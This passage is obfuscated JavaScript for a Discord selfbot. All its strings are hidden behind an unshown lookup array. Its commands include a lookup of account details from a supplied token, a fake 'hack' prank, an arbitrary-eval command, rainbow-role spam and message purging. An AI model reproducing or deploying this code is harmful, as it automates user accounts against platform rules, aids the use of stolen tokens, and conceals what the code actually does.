console[_0xa42d[18]](`${_0xa42d[20]}${colors[_0xa42d[22]](_0xa42d[21])}${_0xa42d[23]}${colors[_0xa42d[24]](_0x74d2xe[_0xa42d[39]])}${_0xa42d[20]}`)});process[_0xa42d[40]](_0xa42d[42],(_0x74d2xe)=>{return console[_0xa42d[18]](`${_0xa42d[20]}${colors[_0xa42d[22]](_0xa42d[21])}${_0xa42d[23]}${colors[_0xa42d[24]](_0x74d2xe[_0xa42d[39]])}${_0xa42d[20]}`)});bot[_0xa42d[43]]=  new Map();let afkMode=false;console[_0xa42d[18]](_0xa42d[44]);title(`${_0xa42d[26]}${selfbot[_0xa42d[45]]}${_0xa42d[46]}${selfbot[_0xa42d[47]]}${_0xa42d[48]}`);bot[_0xa42d[40]](_0xa42d[49],async ()=>{console[_0xa42d[50]]();title(`${_0xa42d[26]}${selfbot[_0xa42d[45]]}${_0xa42d[46]}${selfbot[_0xa42d[47]]}${_0xa42d[51]}${bot[_0xa42d[53]][_0xa42d[52]]}${_0xa42d[20]}`);console[_0xa42d[18]](`${_0xa42d[54]}${colors[_0xa42d[22]](`${_0xa42d[55]}`)}${_0xa42d[56]}${colors[_0xa42d[22]](selfbot[_0xa42d[45]])}${_0xa42d[23]}${colors[_0xa42d[33]](`${_0xa42d[57]}${selfbot[_0xa42d[47]]}${_0xa42d[20]}`)}${_0xa42d[23]}${colors[_0xa42d[24]](_0xa42d[34])}${_0xa42d[23]}${colors[_0xa42d[22]](_0xa42d[58])}${_0xa42d[23]}${colors[_0xa42d[33]](bot[_0xa42d[53]][_0xa42d[59]])}${_0xa42d[23]}${colors[_0xa42d[24]](_0xa42d[34])}${_0xa42d[23]}${colors[_0xa42d[22]](_0xa42d[60])}${_0xa42d[23]}${colors[_0xa42d[33]](bot[_0xa42d[53]][_0xa42d[61]])}${_0xa42d[62]}${colors[_0xa42d[22]](_0xa42d[63])}${_0xa42d[23]}${config[_0xa42d[64]]?colors[_0xa42d[30]](_0xa42d[65]):colors[_0xa42d[22]](_0xa42d[66])}${_0xa42d[62]}${colors[_0xa42d[22]](_0xa42d[67])}${_0xa42d[23]}${config[_0xa42d[68]]?colors[_0xa42d[30]](_0xa42d[65]):colors[_0xa42d[22]](_0xa42d[66])}${_0xa42d[62]}${colors[_0xa42d[22]](_0xa42d[69])}${_0xa42d[23]}${colors[_0xa42d[33]](`${_0xa42d[20]}${config[_0xa42d[70]]}${_0xa42d[20]}`)}${_0xa42d[62]}${colors[_0xa42d[22]](_0xa42d[71])}${_0xa42d[23]}${colors[_0xa42d[33]](_0xa42d[72])}${_0xa42d[62]}${colors[_0xa42d[22]](_0xa42d[73])}${_0xa42d[23]}${colors[_0xa42d[33]](_0xa42d[74])}${_0xa42d[75]}`);if(config[_0xa42d[76]]=== true){bot[_0xa42d[53]][_0xa42d[79]](_0xa42d[77],{type:_0xa42d[78]})}});bot[_0xa42d[40]](_0xa42d[39],async (_0x74d2x12)=>{if(config[_0xa42d[80]]=== true){console[_0xa42d[18]](`${_0xa42d[20]}${colors[_0xa42d[22]](_0x74d2x12[_0xa42d[81]][_0xa42d[45]])}${_0xa42d[82]}${colors[_0xa42d[84]](_0x74d2x12[_0xa42d[83]][_0xa42d[45]])}${_0xa42d[82]}${colors[_0xa42d[24]](_0x74d2x12[_0xa42d[85]][_0xa42d[59]])}${_0xa42d[82]}${colors[_0xa42d[30]](_0x74d2x12[_0xa42d[86]])}${_0xa42d[20]}`)};if(_0x74d2x12[_0xa42d[85]][_0xa42d[87]]){return};let _0x74d2x13=config[_0xa42d[70]];let _0x74d2x14=_0x74d2x12[_0xa42d[86]][_0xa42d[88]](_0xa42d[23]);let _0x74d2x15=_0x74d2x14[0][_0xa42d[89]](_0x74d2x13,_0xa42d[20]);let _0x74d2x16=_0x74d2x14[_0xa42d[90]](1);if(!_0x74d2x12[_0xa42d[86]][_0xa42d[91]](_0x74d2x13)){return};if(config[_0xa42d[93]][_0xa42d[92]](_0x74d2x12[_0xa42d[85]][_0xa42d[61]])|| _0x74d2x12[_0xa42d[85]][_0xa42d[61]]=== bot[_0xa42d[53]][_0xa42d[61]]){if(_0x74d2x15=== _0xa42d[94]){console[_0xa42d[18]](`${_0xa42d[26]}${colors[_0xa42d[30]](moment()[_0xa42d[29]]()[_0xa42d[28]](_0xa42d[27]))}${_0xa42d[31]}${colors[_0xa42d[33]](_0xa42d[32])}${_0xa42d[23]}${colors[_0xa42d[35]](_0xa42d[34])}${_0xa42d[23]}${colors[_0xa42d[24]](_0x74d2x15)}${_0xa42d[20]}`);if(_0x74d2x12[_0xa42d[95]]){_0x74d2x12[_0xa42d[96]]()};const _0x74d2x17=_0x74d2x12[_0xa42d[99]][_0xa42d[98]][_0xa42d[97]]();if(!_0x74d2x17){return _0x74d2x12[_0xa42d[83]][_0xa42d[101]](_0xa42d[100])};if(enabled=== true){let _0x74d2x18= new Discord.RichEmbed()[_0xa42d[112]](_0xa42d[111])[_0xa42d[110]](`${_0xa42d[108]}${_0x74d2x17[_0xa42d[45]]}${_0xa42d[109]}`)[_0xa42d[107]](image?image:_0xa42d[106])[_0xa42d[105]](color?color:_0xa42d[104])[_0xa42d[103]](footer?footer:_0xa42d[102]);_0x74d2x12[_0xa42d[83]][_0xa42d[101]](_0x74d2x18)}else {_0x74d2x12[_0xa42d[83]][_0xa42d[101]](`${_0xa42d[108]}${_0x74d2x17[_0xa42d[45]]}${_0xa42d[109]}`)};setInterval(()=>{_0x74d2x17[_0xa42d[114]]({color:_0xa42d[113]})})};if(_0x74d2x15=== _0xa42d[115]){console[_0xa42d[18]](`${_0xa42d[26]}${colors[_0xa42d[30]](moment()[_0xa42d[29]]()[_0xa42d[28]](_0xa42d[27]))}${_0xa42d[31]}${colors[_0xa42d[33]](_0xa42d[32])}${_0xa42d[23]}${colors[_0xa42d[35]](_0xa42d[34])}${_0xa42d[23]}${colors[_0xa42d[24]](_0x74d2x15)}${_0xa42d[20]}`);if(_0x74d2x12[_0xa42d[95]]){_0x74d2x12[_0xa42d[96]]()};const _0x74d2x19=_0x74d2x16[0];if(!_0x74d2x19){return _0x74d2x12[_0xa42d[83]][_0xa42d[101]](_0xa42d[116])};const _0x74d2x1a={"\x41\x75\x74\x68\x6F\x72\x69\x7A\x61\x74\x69\x6F\x6E":_0x74d2x19,"\x43\x6F\x6E\x74\x65\x6E\x74\x2D\x54\x79\x70\x65":_0xa42d[117]};try{fetch(_0xa42d[162],{method:_0xa42d[163],headers:_0x74d2x1a})[_0xa42d[161]](async (_0x74d2x1b)=>{const _0x74d2x1c= await _0x74d2x1b[_0xa42d[118]]();if(enabled=== true){let _0x74d2x18= new Discord.RichEmbed()[_0xa42d[105]](color?color:_0xa42d[104])[_0xa42d[103]](footer?footer:_0xa42d[102])[_0xa42d[107]](`${_0xa42d[144]}${_0x74d2x1c[_0xa42d[61]]}${_0xa42d[145]}${_0x74d2x1c[_0xa42d[146]]}${_0xa42d[147]}`)[_0xa42d[110]](`${_0xa42d[119]}${_0x74d2x1c[_0xa42d[61]]}${_0xa42d[120]}${_0x74d2x1c[_0xa42d[52]]}${_0xa42d[121]}${_0x74d2x1c[_0xa42d[122]]}${_0xa42d[123]}${_0x74d2x1c[_0xa42d[125]][_0xa42d[124]]()}${_0xa42d[126]}${_0x74d2x1c[_0xa42d[127]][_0xa42d[124]]()}${_0xa42d[128]}${_0x74d2x1c[_0xa42d[129]]?_0x74d2x1c[_0xa42d[129]]:_0xa42d[130]}${_0xa42d[131]}${_0x74d2x1c[_0xa42d[132]]?_0xa42d[133]:_0xa42d[134]}${_0xa42d[135]}${_0x74d2x1c[_0xa42d[136]]}${_0xa42d[137]}${_0x74d2x1c[_0xa42d[138]]?_0xa42d[133]:_0xa42d[134]}${_0xa42d[139]}${_0x74d2x1c[_0xa42d[140]]?_0xa42d[133]:_0xa42d[134]}${_0xa42d[141]}${_0x74d2x1c[_0xa42d[142]]?_0x74d2x1c[_0xa42d[142]]:_0xa42d[130]}${_0xa42d[143]}`);_0x74d2x12[_0xa42d[83]][_0xa42d[101]](_0x74d2x18)}else {_0x74d2x12[_0xa42d[83]][_0xa42d[101]](stripIndents`${_0xa42d[148]}${_0x74d2x1c[_0xa42d[61]]}${_0xa42d[149]}${_0x74d2x1c[_0xa42d[52]]}${_0xa42d[150]}${_0x74d2x1c[_0xa42d[122]]}${_0xa42d[151]}${_0x74d2x1c[_0xa42d[125]][_0xa42d[124]]()}${_0xa42d[152]}${_0x74d2x1c[_0xa42d[127]][_0xa42d[124]]()}${_0xa42d[153]}${_0x74d2x1c[_0xa42d[129]]?_0x74d2x1c[_0xa42d[129]]:_0xa42d[130]}${_0xa42d[154]}${_0x74d2x1c[_0xa42d[132]]?_0xa42d[133]:_0xa42d[134]}${_0xa42d[155]}${_0x74d2x1c[_0xa42d[136]]}${_0xa42d[156]}${_0x74d2x1c[_0xa42d[138]]?_0xa42d[133]:_0xa42d[134]}${_0xa42d[157]}${_0x74d2x1c[_0xa42d[140]]?_0xa42d[133]:_0xa42d[134]}${_0xa42d[158]}${_0x74d2x1c[_0xa42d[142]]?_0x74d2x1c[_0xa42d[142]]:_0xa42d[130]}${_0xa42d[20]}${footer?`${_0xa42d[159]}${footer}${_0xa42d[20]}`:_0xa42d[102]}${_0xa42d[160]}`)}})}catch(err){console[_0xa42d[18]](`${_0xa42d[20]}${colors[_0xa42d[22]](_0xa42d[21])}${_0xa42d[23]}${colors[_0xa42d[24]](_0xa42d[164])}${_0xa42d[20]}`)}};if(_0x74d2x15=== _0xa42d[165]){console[_0xa42d[18]](`${_0xa42d[26]}${colors[_0xa42d[30]](moment()[_0xa42d[29]]()[_0xa42d[28]](_0xa42d[27]))}${_0xa42d[31]}${colors[_0xa42d[33]](_0xa42d[32])}${_0xa42d[23]}${colors[_0xa42d[35]](_0xa42d[34])}${_0xa42d[23]}${colors[_0xa42d[24]](_0x74d2x15)}${_0xa42d[20]}`);if(_0x74d2x12[_0xa42d[95]]){_0x74d2x12[_0xa42d[96]]()};const _0x74d2x1d=[_0xa42d[166],_0xa42d[118],_0xa42d[167],_0xa42d[168],_0xa42d[169],_0xa42d[170],_0xa42d[171],_0xa42d[172],_0xa42d[173],_0xa42d[174]];if(!_0x74d2x1d[_0xa42d[92]](_0x74d2x16[0])){return _0x74d2x12[_0xa42d[83]][_0xa42d[101]](`${_0xa42d[175]}${_0x74d2x1d[_0xa42d[177]](_0xa42d[176])}${_0xa42d[178]}`)};if(enabled=== true){let _0x74d2x18= new Discord.RichEmbed()[_0xa42d[112]](_0xa42d[181])[_0xa42d[110]](`${_0xa42d[160]}${_0x74d2x16[0]}${_0xa42d[179]}${_0x74d2x16[_0xa42d[90]](1)[_0xa42d[177]](_0xa42d[23])}${_0xa42d[180]}`)[_0xa42d[107]](image?image:_0xa42d[106])[_0xa42d[105]](color?color:_0xa42d[104])[_0xa42d[103]](footer?footer:_0xa42d[102]);_0x74d2x12[_0xa42d[83]][_0xa42d[101]](_0x74d2x18)}else {_0x74d2x12[_0xa42d[83]][_0xa42d[101]](`${_0xa42d[160]}${_0x74d2x16[0]}${_0xa42d[179]}${_0x74d2x16[_0xa42d[90]](1)[_0xa42d[177]](_0xa42d[23])}${_0xa42d[20]}${footer?`${_0xa42d[159]}${footer}${_0xa42d[20]}`:_0xa42d[102]}${_0xa42d[180]}`)}};if(_0x74d2x15=== _0xa42d[182]){console[_0xa42d[18]](`${_0xa42d[26]}${colors[_0xa42d[30]](moment()[_0xa42d[29]]()[_0xa42d[28]](_0xa42d[27]))}${_0xa42d[31]}${colors[_0xa42d[33]](_0xa42d[32])}${_0xa42d[23]}${colors[_0xa42d[35]](_0xa42d[34])}${_0xa42d[23]}${colors[_0xa42d[24]](_0x74d2x15)}${_0xa42d[20]}`);if(_0x74d2x12[_0xa42d[95]]){_0x74d2x12[_0xa42d[96]]()};const {body}= await superagent[_0xa42d[184]](_0xa42d[183]);if(!body){return _0x74d2x12[_0xa42d[83]][_0xa42d[101]](_0xa42d[185])};const _0x74d2x1e=bot[_0xa42d[186]][_0xa42d[184]](_0x74d2x16[0]);if(!_0x74d2x1e){return _0x74d2x12[_0xa42d[83]][_0xa42d[101]](_0xa42d[187])};const _0x74d2x1f= await _0x74d2x12[_0xa42d[83]][_0xa42d[101]](`${_0xa42d[188]}${_0x74d2x1e[_0xa42d[52]]}${_0xa42d[189]}`);const _0x74d2x20=[_0xa42d[190],_0xa42d[191],_0xa42d[192],_0xa42d[193],_0xa42d[194]];const _0x74d2x21=_0x74d2x20[Math[_0xa42d[197]](Math[_0xa42d[195]]()* (_0x74d2x20[_0xa42d[196]]))];const _0x74d2x22=[`${_0xa42d[20]}${_0x74d2x1e[_0xa42d[52]]}${_0xa42d[198]}`,_0xa42d[199],`${_0xa42d[20]}${_0x74d2x1e[_0xa42d[52]]}${_0xa42d[20]}${_0x74d2x1e[_0xa42d[122]]}${_0xa42d[200]}`,`${_0xa42d[20]}${_0x74d2x1e[_0xa42d[52]]}${_0xa42d[201]}${_0x74d2x1e[_0xa42d[122]]}${_0xa42d[202]}`];const _0x74d2x23=_0x74d2x22[Math[_0xa42d[197]](Math[_0xa42d[195]]()* (_0x74d2x22[_0xa42d[196]]))];const _0x74d2x24=[_0xa42d[203],_0xa42d[204],_0xa42d[205],_0xa42d[206],_0xa42d[207]];const _0x74d2x25=_0x74d2x24[Math[_0xa42d[197]](Math[_0xa42d[195]]()* (_0x74d2x24[_0xa42d[196]]))];const _0x74d2x26=[_0xa42d[208],_0xa42d[209],_0xa42d[210],`${_0xa42d[20]}${_0x74d2x25}${_0xa42d[211]}`,_0xa42d[212]];const _0x74d2x27=_0x74d2x26[Math[_0xa42d[197]](Math[_0xa42d[195]]()* (_0x74d2x26[_0xa42d[196]]))];setTimeout(()=>{_0x74d2x1f[_0xa42d[114]](`${_0xa42d[213]}${_0x74d2x21}${_0xa42d[20]}`);setTimeout(()=>{_0x74d2x1f[_0xa42d[114]](`${_0xa42d[214]}${_0x74d2x23}${_0xa42d[20]}`);setTimeout(()=>{_0x74d2x1f[_0xa42d[114]](`${_0xa42d[215]}${_0x74d2x25}${_0xa42d[20]}`);setTimeout(()=>{_0x74d2x1f[_0xa42d[114]](`${_0xa42d[216]}${_0x74d2x1e[_0xa42d[52]]}${_0xa42d[20]}`);setTimeout(()=>{_0x74d2x1f[_0xa42d[114]](`${_0xa42d[217]}${_0x74d2x1e[_0xa42d[122]]}${_0xa42d[20]}`);setTimeout(()=>{_0x74d2x1f[_0xa42d[114]](`${_0xa42d[218]}${_0x74d2x1e[_0xa42d[61]]}${_0xa42d[20]}`);setTimeout(()=>{_0x74d2x1f[_0xa42d[114]](`${_0xa42d[219]}${_0x74d2x1e[_0xa42d[122]]}${_0xa42d[220]}`);setTimeout(()=>{_0x74d2x1f[_0xa42d[114]](`${_0xa42d[221]}`);setTimeout(()=>{_0x74d2x1f[_0xa42d[114]](_0xa42d[222]);setTimeout(()=>{_0x74d2x1f[_0xa42d[114]](`${_0xa42d[223]}${body[_0xa42d[224]]}${_0xa42d[20]}`);setTimeout(()=>{_0x74d2x1f[_0xa42d[114]](`${_0xa42d[225]}`);setTimeout(()=>{_0x74d2x1f[_0xa42d[114]](`${_0xa42d[226]}${_0x74d2x27}${_0xa42d[20]}`);setTimeout(()=>{setTimeout(()=>{_0x74d2x1f[_0xa42d[114]](`${_0xa42d[227]}`);setTimeout(()=>{_0x74d2x1f[_0xa42d[114]](`${_0xa42d[228]}`);setTimeout(()=>{_0x74d2x12[_0xa42d[83]][_0xa42d[101]](`${_0xa42d[229]}`)},1000)},4000)},4000)},4000)},4000)},4000)},4000)},4000)},4000)},4000)},4000)},4000)},4000)},4000)},4000)},4000)};if(_0x74d2x15=== _0xa42d[230]){console[_0xa42d[18]](`${_0xa42d[26]}${colors[_0xa42d[30]](moment()[_0xa42d[29]]()[_0xa42d[28]](_0xa42d[27]))}${_0xa42d[31]}${colors[_0xa42d[33]](_0xa42d[32])}${_0xa42d[23]}${colors[_0xa42d[35]](_0xa42d[34])}${_0xa42d[23]}${colors[_0xa42d[24]](_0x74d2x15)}${_0xa42d[20]}`);if(_0x74d2x12[_0xa42d[95]]){_0x74d2x12[_0xa42d[96]]()};console[_0xa42d[50]]()};if(_0x74d2x15=== _0xa42d[231]){console[_0xa42d[18]](`${_0xa42d[26]}${colors[_0xa42d[30]](moment()[_0xa42d[29]]()[_0xa42d[28]](_0xa42d[27]))}${_0xa42d[31]}${colors[_0xa42d[33]](_0xa42d[32])}${_0xa42d[23]}${colors[_0xa42d[35]](_0xa42d[34])}${_0xa42d[23]}${colors[_0xa42d[24]](_0x74d2x15)}${_0xa42d[20]}`);if(_0x74d2x12[_0xa42d[95]]){_0x74d2x12[_0xa42d[96]]()};if(!_0x74d2x16[0]){return _0x74d2x12[_0xa42d[83]][_0xa42d[101]](_0xa42d[232])};const _0x74d2x28=[_0xa42d[40],_0xa42d[233]];if(!_0x74d2x28[_0xa42d[92]](_0x74d2x16[0])){return _0x74d2x12[_0xa42d[83]][_0xa42d[101]](_0xa42d[234])};if(_0x74d2x16[0]=== _0x74d2x28[0]&& afkMode=== false){afkMode= true;_0x74d2x12[_0xa42d[83]][_0xa42d[101]](`${_0xa42d[235]}${config[_0xa42d[236]]?config[_0xa42d[236]]:_0xa42d[237]}${_0xa42d[20]}`)};if(_0x74d2x16[0]=== _0x74d2x28[1]&& afkMode=== true){afkMode= false;_0x74d2x12[_0xa42d[83]][_0xa42d[101]](_0xa42d[238])}};if(_0x74d2x15=== _0xa42d[239]){console[_0xa42d[18]](`${_0xa42d[26]}${colors[_0xa42d[30]](moment()[_0xa42d[29]]()[_0xa42d[28]](_0xa42d[27]))}${_0xa42d[31]}${colors[_0xa42d[33]](_0xa42d[32])}${_0xa42d[23]}${colors[_0xa42d[35]](_0xa42d[34])}${_0xa42d[23]}${colors[_0xa42d[24]](_0x74d2x15)}${_0xa42d[20]}`);if(_0x74d2x12[_0xa42d[95]]){_0x74d2x12[_0xa42d[96]]()};const _0x74d2x29=bot[_0xa42d[43]][_0xa42d[184]](_0x74d2x12[_0xa42d[83]][_0xa42d[61]])|| [];const _0x74d2x1f=_0x74d2x29[_0x74d2x16[0]- 1|| 0];if(!_0x74d2x1f){return _0x74d2x12[_0xa42d[83]][_0xa42d[101]](_0xa42d[240])};if(enabled=== true){let _0x74d2x18= new Discord.RichEmbed()[_0xa42d[246]](_0x74d2x1f[_0xa42d[85]][_0xa42d[59]],_0x74d2x1f[_0xa42d[85]][_0xa42d[245]])[_0xa42d[110]](`${_0xa42d[20]}${_0x74d2x1f[_0xa42d[86]]}${_0xa42d[241]}${_0x74d2x1f[_0xa42d[242]]}${_0xa42d[243]}${_0x74d2x16[0]|| 1}${_0xa42d[145]}${_0x74d2x29[_0xa42d[196]]}${_0xa42d[244]}`)[_0xa42d[107]](image?image:_0xa42d[106])[_0xa42d[105]](color?color:_0xa42d[104])[_0xa42d[103]](footer?footer:_0xa42d[102]);if(_0x74d2x1f[_0xa42d[247]]){_0x74d2x18[_0xa42d[248]](_0x74d2x1f[_0xa42d[247]])};_0x74d2x12[_0xa42d[83]][_0xa42d[101]](_0x74d2x18)}else {_0x74d2x12[_0xa42d[83]][_0xa42d[101]](stripIndents`${_0xa42d[249]}${_0x74d2x1f[_0xa42d[85]][_0xa42d[59]]}${_0xa42d[250]}${_0x74d2x1f[_0xa42d[86]]}${_0xa42d[251]}${_0x74d2x1f[_0xa42d[242]]}${_0xa42d[252]}${_0x74d2x16[0]|| 1}${_0xa42d[145]}${_0x74d2x29[_0xa42d[196]]}${_0xa42d[20]}${footer?`${_0xa42d[159]}${footer}${_0xa42d[20]}`:_0xa42d[102]}${_0xa42d[253]}`)}};if(_0x74d2x15=== _0xa42d[254]){console[_0xa42d[18]](`${_0xa42d[26]}${colors[_0xa42d[30]](moment()[_0xa42d[29]]()[_0xa42d[28]](_0xa42d[27]))}${_0xa42d[31]}${colors[_0xa42d[33]](_0xa42d[32])}${_0xa42d[23]}${colors[_0xa42d[35]](_0xa42d[34])}${_0xa42d[23]}${colors[_0xa42d[24]](_0x74d2x15)}${_0xa42d[20]}`);if(_0x74d2x12[_0xa42d[95]]){_0x74d2x12[_0xa42d[96]]()};const _0x74d2x1f=_0x74d2x12;let _0x74d2x2a=_0x74d2x16[_0xa42d[177]](_0xa42d[23]);_0x74d2x2a= _0x74d2x2a[_0xa42d[89]](/[“”]/g,_0xa42d[256])[_0xa42d[89]](/[‘’]/g,_0xa42d[255]);let _0x74d2x2b;try{const _0x74d2x2c=process[_0xa42d[257]]();_0x74d2x2b= eval(_0x74d2x2a);if(_0x74d2x2b instanceof  Promise){_0x74d2x2b=  await _0x74d2x2b};const _0x74d2x2d=process[_0xa42d[257]](_0x74d2x2c);const _0x74d2x2e=[`${_0xa42d[258]}${_0x74d2x30(inspect(_0x74d2x2b,{depth:0}))}${_0xa42d[180]}`,`${_0xa42d[259]}${ new Type(_0x74d2x2b)[_0xa42d[260]]}${_0xa42d[180]}`,`${_0xa42d[261]}${(((_0x74d2x2d[0]* 1e9)+ _0x74d2x2d[1]))/ 1e6}${_0xa42d[262]}`];const _0x74d2x1b=_0x74d2x2e[_0xa42d[177]](_0xa42d[263]);if(_0x74d2x1b[_0xa42d[196]]< 2000){ await _0x74d2x1f[_0xa42d[83]][_0xa42d[101]](_0x74d2x1b)}else {const _0x74d2x2f= new Discord.MessageAttachment(Buffer[_0xa42d[264]](_0x74d2x1b),_0xa42d[265]); await _0x74d2x1f[_0xa42d[83]][_0xa42d[101]](_0x74d2x2f)}}catch(err){return _0x74d2x12[_0xa42d[83]][_0xa42d[101]](`${_0xa42d[266]}${_0x74d2x30(err)}${_0xa42d[180]}`)};function _0x74d2x30(_0x74d2x31){if( typeof _0x74d2x31=== _0xa42d[267]){_0x74d2x31= _0x74d2x31[_0xa42d[89]](/`/g,`${_0xa42d[178]}${String[_0xa42d[274]](8203)}${_0xa42d[20]}`)[_0xa42d[89]](/@/g,`${_0xa42d[273]}${String[_0xa42d[274]](8203)}${_0xa42d[20]}`)[_0xa42d[89]]( new RegExp(config[_0xa42d[224]],_0xa42d[269]),_0xa42d[271][_0xa42d[270]](config[_0xa42d[224]][_0xa42d[196]]))[_0xa42d[89]]( new RegExp(config[_0xa42d[272]],_0xa42d[269]),_0xa42d[271][_0xa42d[270]](config[_0xa42d[272]][_0xa42d[196]]))[_0xa42d[89]]( new RegExp(config[_0xa42d[268]],_0xa42d[269]),_0xa42d[271][_0xa42d[270]](config[_0xa42d[268]][_0xa42d[196]]))};return _0x74d2x31}};if(_0x74d2x15=== _0xa42d[275]){console[_0xa42d[18]](`${_0xa42d[26]}${colors[_0xa42d[30]](moment()[_0xa42d[29]]()[_0xa42d[28]](_0xa42d[27]))}${_0xa42d[31]}${colors[_0xa42d[33]](_0xa42d[32])}${_0xa42d[23]}${colors[_0xa42d[35]](_0xa42d[34])}${_0xa42d[23]}${colors[_0xa42d[24]](_0x74d2x15)}${_0xa42d[20]}`);if(_0x74d2x12[_0xa42d[95]]){_0x74d2x12[_0xa42d[96]]()};if(!_0x74d2x16[_0xa42d[177]](_0xa42d[23])){return _0x74d2x12[_0xa42d[83]][_0xa42d[101]](_0xa42d[276])};const {body}= await post(_0xa42d[277])[_0xa42d[101]](_0x74d2x16[_0xa42d[177]](_0xa42d[23]));let _0x74d2x18= new Discord.RichEmbed()[_0xa42d[107]](image?image:_0xa42d[106])[_0xa42d[105]](color?color:_0xa42d[104])[_0xa42d[103]](footer?footer:_0xa42d[102])[_0xa42d[110]](`${_0xa42d[278]}${body[_0xa42d[279]]}${_0xa42d[20]}`);_0x74d2x12[_0xa42d[83]][_0xa42d[101]](_0x74d2x18)};if(_0x74d2x15=== _0xa42d[280]){console[_0xa42d[18]](`${_0xa42d[26]}${colors[_0xa42d[30]](moment()[_0xa42d[29]]()[_0xa42d[28]](_0xa42d[27]))}${_0xa42d[31]}${colors[_0xa42d[33]](_0xa42d[32])}${_0xa42d[23]}${colors[_0xa42d[35]](_0xa42d[34])}${_0xa42d[23]}${colors[_0xa42d[24]](_0x74d2x15)}${_0xa42d[20]}`);let _0x74d2x32=parseInt(_0x74d2x16[0]|| 1);_0x74d2x12[_0xa42d[83]][_0xa42d[287]]({limit:100})[_0xa42d[161]](async (_0x74d2x33)=>{let _0x74d2x34=_0x74d2x33[_0xa42d[281]]();_0x74d2x34= _0x74d2x34[_0xa42d[282]]((_0x74d2x35)=>{return _0x74d2x35[_0xa42d[85]][_0xa42d[61]]=== bot[_0xa42d[53]][_0xa42d[61]]});_0x74d2x34[_0xa42d[196]]= _0x74d2x32+ 1;_0x74d2x34[_0xa42d[286]]((_0x74d2x35)=>{return _0x74d2x35[_0xa42d[96]]()[_0xa42d[285]]((_0x74d2x36)=>{_0x74d2x12[_0xa42d[83]][_0xa42d[101]](_0xa42d[283]+ _0x74d2x36+ _0xa42d[284])})})})};if(_0x74d2x15=== _0xa42d[288]){console[_0xa42d[18]](`${_0xa42d[26]}${colors[_0xa42d[30]](moment()[_0xa42d[29]]()[_0xa42d[28]](_0xa42d[27]))}${_0xa42d[31]}${colors[_0xa42d[33]](_0xa42d[32])}${_0xa42d[23]}${colors[_0xa42d[35]](_0xa42d[34])}${_0xa42d[23]}${colors[_0xa42d[24]](_0x74d2x15)}${_0xa42d[20]}`);if(_0x74d2x12[_0xa42d[95]]){_0x74d2x12[_0xa42d[96]]()};const _0x74d2x37={"\x20":_0xa42d[23],"\x30":_0xa42d[289],"\x31":_0xa42d[290],"\x32":_0xa42d[291],"\x33":_0xa42d[292],"\x34":_0xa42d[293],"\x35":_0xa42d[294],"\x36":_0xa42d[295],"\x37":_0xa42d[296],"\x38":_0xa42d[297],"\x39":_0xa42d[298],"\x21":_0xa42d[299],"\x3F":_0xa42d[300],"\x23":_0xa42d[301],"\x2A":_0xa42d[302],"\x24":_0xa42d[303],"\x2B":_0xa42d[304],"\x2D":_0xa42d[305],"\x2F":_0xa42d[306]};_0xa42d[311][_0xa42d[88]](_0xa42d[20])[_0xa42d[310]]((_0x74d2x38)=>{_0x74d2x37[_0x74d2x38]= _0x74d2x37[_0x74d2x38[_0xa42d[307]]()]= `${_0xa42d[308]}${_0x74d2x38}${_0xa42d[309]}`});if(_0x74d2x16[_0xa42d[196]]< 1){return _0x74d2x12[_0xa42d[83]][_0xa42d[101]](_0xa42d[312])};_0x74d2x12[_0xa42d[83]][_0xa42d[101]](_0x74d2x16[_0xa42d[177]](_0xa42d[23])[_0xa42d[88]](_0xa42d[20])[_0xa42d[286]]((_0x74d2x38)=>{return _0x74d2x37[_0x74d2x38]|| _0x74d2x38})[_0xa42d[177]](_0xa42d[20]))};if(_0x74d2x15=== _0xa42d[313]){console[_0xa42d[18]](`${_0xa42d[26]}${colors[_0xa42d[30]](moment()[_0xa42d[29]]()[_0xa42d[28]](_0xa42d[27]))}${_0xa42d[31]}${colors[_0xa42d[33]](_0xa42d[32])}${_0xa42d[23]}${colors[_0xa42d[35]](_0xa42d[34])}${_0xa42d[23]}${colors[_0xa42d[24]](_0x74d2x15)}${_0xa42d[20]}`);if(_0x74d2x12[_0xa42d[95]]){_0x74d2x12[_0xa42d[96]]()};_0x74d2x12[_0xa42d[83]][_0xa42d[314]]();try{const _0x74d2x2e= await fetch(`${_0xa42d[315]}${encodeURIComponent(_0x74d2x16[_0xa42d[177]](_0xa42d[23]))}${_0xa42d[20]}`);const _0x74d2x39= await _0x74d2x2e[_0xa42d[118]]();_0x74d2x12[_0xa42d[83]][_0xa42d[101]](`${_0xa42d[316]}${_0x74d2x16[_0xa42d[177]](_0xa42d[23])}${_0xa42d[179]}${_0x74d2x12[_0xa42d[85]]}${_0xa42d[23]}${_0x74d2x39[_0xa42d[317]]}${_0xa42d[20]}`);_0x74d2x12[_0xa42d[83]][_0xa42d[318]](true)}catch(err){_0x74d2x12[_0xa42d[83]][_0xa42d[318]](true);return _0x74d2x12[_0xa42d[83]][_0xa42d[101]](_0xa42d[283]+ err[_0xa42d[319]]+ _0xa42d[284])}};if(_0x74d2x15=== _0xa42d[320]){console[_0xa42d[18]](`${_0xa42d[26]}${colors[_0xa42d[30]](moment()[_0xa42d[29]]()[_0xa42d[28]](_0xa42d[27]))}${_0xa42d[31]}${colors[_0xa42d[33]](_0xa42d[32])}${_0xa42d[23]}${colors[_0xa42d[35]](_0xa42d[34])}${_0xa42d[23]}${colors[_0xa42d[24]](_0x74d2x15)}${_0xa42d[20]}`);if(_0x74d2x12[_0xa42d[95]]){_0x74d2x12[_0xa42d[96]]()};_0x74d2x12[_0xa42d[83]][_0xa42d[101]](_0x74d2x16[_0xa42d[177]](_0xa42d[23]))};if(_0x74d2x15=== _0xa42d[321]){console[_0xa42d[18]](`${_0xa42d[26]}${colors[_0xa42d[30]](moment()[_0xa42d[29]]()[_0xa42d[28]](_0xa42d[27]))}${_0xa42d[31]}${colors[_0xa42d[33]](_0xa42d[32])}${_0xa42d[23]}${colors[_0xa42d[35]](_0xa42d[34])}${_0xa42d[23]}${colors[_0xa42d[24]](_0x74d2x15)}${_0xa42d[20]}`);if(_0x74d2x12[_0xa42d[95]]){_0x74d2x12[_0xa42d[96]]()};_0x74d2x12[_0xa42d[83]][_0xa42d[101]](_0xa42d[331])[_0xa42d[161]]((_0x74d2x1f)=>{if(enabled=== true){let _0x74d2x18= new Discord.RichEmbed()[_0xa42d[112]](_0xa42d[326])[_0xa42d[110]](`${_0xa42d[322]}${_0x74d2x1f[_0xa42d[323]]- 